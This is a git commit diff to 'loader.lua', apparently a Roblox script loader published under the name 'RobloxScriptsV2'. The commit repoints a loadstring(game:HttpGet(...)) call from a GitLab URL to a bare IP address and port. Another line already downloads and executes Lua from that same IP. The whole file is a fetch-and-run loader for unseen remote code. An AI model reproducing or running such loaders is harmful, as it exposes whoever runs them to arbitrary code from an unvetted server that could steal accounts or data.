c87a95aefef71f39580150017751e79c5b943c98
RobloxScriptsV2 <mernaif3@gmail.com>
2026-02-07 08:47:38 +0800

    loader.lua

--- loader.lua
+++ loader.lua
@@ -1,4 +1,4 @@
 ID="4c78314a-bc55-43c0-9947-1c9db37afdab"
-RUN_AFTER=loadstring(game:HttpGet("https://gitlab.com/rlbx-scripts/elysium/-/raw/main/adm-visual"))()
+RUN_AFTER=loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/visual.luau"));
 
 loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))()
